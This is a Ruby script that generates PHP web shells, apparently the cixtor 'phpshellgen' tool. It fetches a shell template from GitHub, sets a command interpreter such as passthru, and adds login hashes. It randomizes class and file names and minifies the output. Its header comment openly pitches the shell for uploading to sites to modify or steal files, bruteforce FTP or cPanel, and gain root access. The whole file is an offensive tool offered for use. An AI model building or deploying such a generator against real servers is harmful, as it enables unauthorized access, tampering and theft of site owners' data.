#!/usr/bin/env ruby
#
# PHP-Shell Generator
# http://cixtor.com/phpshell
# https://github.com/cixtor/phpshellgen
#
# A web shell is a piece of code that can be uploaded to a site to gain access to
# files stored on that site. Once it is uploaded, the owner can use it to edit,
# delete, or download any files on the site, or upload their own.
#
# Shells have many uses, they can be used to edit the webserver directory index
# page of site, to bruteforce FTP or cPanel, allowing more access to the
# website. Shells can also be used to gain root access to the site.
#

require 'rubygems'
require 'getoptlong'
require 'digest/sha1'
require 'open-uri'

def header
    puts 'PHP-Shell Generator'
    puts 'http://cixtor.com/phpshell'
    puts 'https://github.com/cixtor/phpshellgen'
    puts
end

def usage
    header
    puts 'Parameters:'
    puts '  -h | --help      | Print this message with the list of available options.'
    puts '  -i | --input     | Specify the shell template to compile.'
    puts '  -o | --output    | Specify the filename for the compiled shell.'
    puts '  -s | --shell     | Specify the default PHP interpreter.'
    puts '  -u | --username  | Specify the username to log into the php-shell.'
    puts '  -p | --password  | Specify the password to log into the php-shell.'
    puts '  -l | --lint      | Enable the PHP linter on the compiled shell.'
    puts
    puts 'Methods:'
    puts '  set_interpreter        | Set the PHP shell interpreter: set_interpreter(shell_exec)'
    puts '  get_interpreter        | Get the current PHP shell interpreter.'
    puts '  get_disabled_functions | Get the list of functions disabled through a "php.ini" file.'
    puts '  get_php_version        | Get the version of the PHP interpreter in execution time.'
    puts '  logout                 | Close the current shell session.'
    puts '  status                 | Display all the configuration variables.'
    puts '  cd new/folder/path/    | Change the current working directory.'
    puts
    puts 'Usage:'
    puts '  phpshellgen'
    puts '  phpshellgen -o /output/here/shell.php'
    puts '  phpshellgen -i /path/to/template.php'
    puts '  phpshellgen -s shell_exec'
    puts '  phpshellgen -u USERNAME -p PASSWORD'
    exit
end

def random_string(length)
    allowed_chars = ('a'..'z').to_a + ('A'..'Z').to_a
    Array.new(length, '').collect { allowed_chars[rand(allowed_chars.size)] }.join('')
end

def get_jquery
    # request = open('http://code.jquery.com/jquery.min.js')
    request = open('https://raw.github.com/cixtor/phpshellgen/master/jquery.min.js')
    request.read
end

def get_jquery_terminal
    request = open('https://raw.github.com/cixtor/phpshellgen/master/jquery.terminal.min.js')
    request.read
end

def get_template(config)
    if config[:input].nil? then
        puts "    Downloading official \e[0;93mcixtor/phpshellgen\e[0m repository template"
        config[:input] = 'https://raw.github.com/cixtor/phpshellgen/master/template.php'
        request = open(config[:input])
        request.read
    elsif File.exists?(config[:input]) then
        puts "    Using shell template specified: \e[0;93m#{config[:input]}\e[0m"
        File.open(config[:input],'r')
    else
        usage
    end
end

config = {
    :input => nil,
    :output => random_string(10) + '.php',
    :shell => 'passthru',
    :username => 'cixtor',
    :password => random_string(10),
    :username_hash => '',
    :password_hash => '',
    :class_name => random_string( rand(10) + 5 ),
    :lint => false
}

options = GetoptLong.new(
    [ '--input', '-i', GetoptLong::OPTIONAL_ARGUMENT ],
    [ '--output', '-o', GetoptLong::OPTIONAL_ARGUMENT ],
    [ '--shell', '-s', GetoptLong::OPTIONAL_ARGUMENT ],
    [ '--username', '-u', GetoptLong::OPTIONAL_ARGUMENT ],
    [ '--password', '-p', GetoptLong::OPTIONAL_ARGUMENT ],
    [ '--lint', '-l', GetoptLong::NO_ARGUMENT ],
    [ '--help', '-h', GetoptLong::NO_ARGUMENT ]
)

begin
    options.each do |option, args|
        case option
            when '--input'
                config[:input] = args
            when '--output'
                config[:output] = args
            when '--shell'
                config[:shell] = args
            when '--username'
                config[:username] = args
            when '--password'
                config[:password] = args
            when '--lint'
                config[:lint] = true
            when '--help'
                usage
            else raise('Invalid option, use --help to get a list of available options.')
        end
    end
rescue GetoptLong::InvalidOption => e
    usage
end

header
config[:username_hash] = Digest::SHA1.hexdigest(config[:username])
config[:password_hash] = Digest::SHA1.hexdigest(config[:password])

puts "\e[0;92mOK.\e[0m Compiling shell into file: '\e[0;94m#{config[:output]}\e[0m'"
puts "    Randomizing Shell class name: \e[0;93m#{config[:class_name]}\e[0m"
output = File.new(config[:output],'w')
template = get_template(config)

template.each_line do |line|
    # Remove unused empty characters.
    line = line.chomp.strip

    # Change the line with the username.
    if line.match(/'username' => '',/) then
        puts "    Hashing username: \e[0;93m#{config[:username]}\e[0m"
        output.write("'username'=>'#{config[:username_hash]}',")

    # Change the line with the password.
    elsif line.match(/'password' => '',/) then
        puts "    Hashing password: \e[0;93m#{config[:password]}\e[0m"
        output.write("'password'=>'#{config[:password_hash]}',")

    # Change the line with the shell interpreter.
    elsif line.match(/'interpreter' => '',/)
        puts "    Settings default interpreter: \e[0;93m#{config[:shell]}\e[0m"
        output.write("'interpreter'=>'#{config[:shell]}',")

    # Change the line with the class name.
    elsif line.match(/class Shell \{/) or line.match(/(new Shell\(\))/) then
        output.write(line.gsub('Shell', config[:class_name]))

    # Change the line with the PHP tags.
    elsif line.match(/^<\?php$/) then
        output.write("<?php ")

    # Change the line with the frontend dependency.
    elsif line.match(/<script type="text\/javascript" src="jquery.min.js"><\/script>/) then
        puts "    Adding jQuery support"
        output.write("<script type='text/javascript'>")
        output.write(get_jquery)
        output.write("</script>")
    elsif line.match(/<script type="text\/javascript" src="jquery.terminal.min.js"><\/script>/) then
        puts "    Adding jQuery.Terminal support"
        output.write("<script type='text/javascript'>")
        output.write(get_jquery_terminal)
        output.write("</script>")

    # Minify the rest of the code.
    else
        line = line.gsub(/[ ]{4}/, '')
        line = line.gsub(/ => /, '=>')
        line = line.gsub(/each\( /, 'each(')
        line = line.gsub(/if\( /, 'if(')
        line = line.gsub(/switch\( /, 'switch(')
        line = line.gsub(/\} else \{/, '}else{')
        line = line.gsub(/\} elseif\( /, '} elseif(')
        line = line.gsub(/ \)\{/, '){')
        line = line.gsub(/ \{/, '{')
        line = line.gsub(/ == /, '==')
        line = line.gsub(/ = /, '=')
        line = line.gsub(/return \( /, 'return(')
        line = line.gsub(/ \? /, '?')
        line = line.gsub(/ : /, ':')

        # Append if not empty.
        if not line.empty? then
            output.write(line)
        end
    end
end

%x{php -l #{config[:output]}} if config[:lint]==true
puts "\e[0;92mOK.\e[0m Finished"
output.close
